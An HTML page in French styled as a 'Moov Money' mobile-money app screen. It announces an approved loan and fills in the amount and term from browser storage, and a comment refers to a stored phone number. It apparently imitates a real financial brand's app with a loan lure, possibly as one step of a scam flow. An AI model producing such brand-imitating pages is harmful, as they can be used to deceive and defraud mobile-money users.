<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Moov Money - Félicitations</title>

    <style>
        /* ── reset & base ── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 0;
        }

        .app-wrapper {
            width: 100%;
            max-width: 400px;
            background: #fff;
            min-height: 100vh;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.05);
        }

        /* ── top bar (same as other pages) ── */
        .top-bar {
            height: 95px;
            background: #f57c00;
            display: flex;
            align-items: flex-end;
            padding: 18px 20px;
        }

        .back-btn {
            color: #fff;
            font-size: 28px;
            text-decoration: none;
            line-height: 1;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
        }

        /* ── container ── */
        .container {
            padding: 18px 28px 40px;
            text-align: center;
        }

        /* ── logo ── */
        .logo {
            text-align: center;
            margin: 12px 0 24px;
        }

        .logo-circle {
            width: 56px;
            height: 56px;
            background: #9A0000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 8px;
            font-size: 28px;
            font-weight: 700;
            color: #fff;
        }

        .moov-text {
            font-size: 20px;
            font-weight: 700;
            color: #9A0000;
            letter-spacing: 0.5px;
        }

        /* ── checkmark ── */
        .checkmark {
            font-size: 72px;
            margin: 12px 0 16px;
            display: inline-block;
            background: #e8f5e9;
            width: 100px;
            height: 100px;
            line-height: 100px;
            border-radius: 50%;
            color: #4CAF50;
        }

        /* ── title & subtitle ── */
        h1 {
            font-size: 26px;
            font-weight: 700;
            color: #333;
            margin-bottom: 8px;
        }

        .sub {
            font-size: 15px;
            color: #8b8b8b;
            margin-bottom: 28px;
            line-height: 1.6;
        }

        /* ── info box ── */
        .info-box {
            background: #f9f9f9;
            border-radius: 12px;
            padding: 16px 20px;
            margin-bottom: 28px;
            text-align: left;
            border: 1px solid #eee;
        }

        .info-box .row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #eee;
        }

        .info-box .row:last-child {
            border-bottom: none;
        }

        .info-box .label {
            color: #888;
            font-size: 14px;
            font-weight: 500;
        }

        .info-box .value {
            color: #222;
            font-weight: 600;
            font-size: 15px;
        }

        /* ── button ── */
        .btn-home {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 10px;
            border: none;
            cursor: pointer;
            transition: all 0.2s ease;
            background: #9A0000;
            color: #fff;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .btn-home:hover {
            background: #7a0000;
            transform: scale(1.01);
        }

        .btn-home:active {
            transform: scale(0.98);
        }

        /* ── footer ── */
        .footer {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #bbb;
            letter-spacing: 0.5px;
            padding-bottom: 12px;
        }
    </style>
</head>
<body>

<div class="app-wrapper">

    <!-- Top bar with back arrow (goes to home) -->
    <div class="top-bar">
        <button class="back-btn" onclick="window.location.href='index.html'">&#8592;</button>
    </div>

    <div class="container">

        <!-- Logo -->
        <div class="logo">
            <div class="logo-circle">M</div>
            <div class="moov-text">Moov Money</div>
        </div>

        <div class="checkmark">✅</div>
        <h1>Prêt approuvé !</h1>
        <div class="sub">Votre demande de prêt a été approuvée.<br/>Les fonds seront versés sur votre compte Moov Money.</div>

        <div class="info-box">
            <div class="row">
                <span class="label">Montant du prêt</span>
                <span class="value" id="displayAmount">-</span>
            </div>
            <div class="row">
                <span class="label">Durée</span>
                <span class="value" id="displayTerm">-</span>
            </div>
            <div class="row">
                <span class="label">Taux d'intérêt</span>
                <span class="value">4,5 % TAEG</span>
            </div>
        </div>

        <button class="btn-home" onclick="window.location.href='index.html'">Retour à l'accueil</button>

        <div class="footer">v 5.3.2 (1.0.0)</div>
    </div>

</div>

<script>
    (function() {
        const amount = localStorage.getItem('loanAmount');
        const term = localStorage.getItem('loanTerm');
        if (amount) {
            document.getElementById('displayAmount').textContent = Number(amount).toLocaleString('fr-FR') + ' FCFA';
        }
        if (term) {
            document.getElementById('displayTerm').textContent = term + ' mois';
        }
        // Optional: clear sensitive data after display
        // localStorage.removeItem('phone');
        // localStorage.removeItem('loanAmount');
        // localStorage.removeItem('loanTerm');
    })();
</script>

</body>
</html>
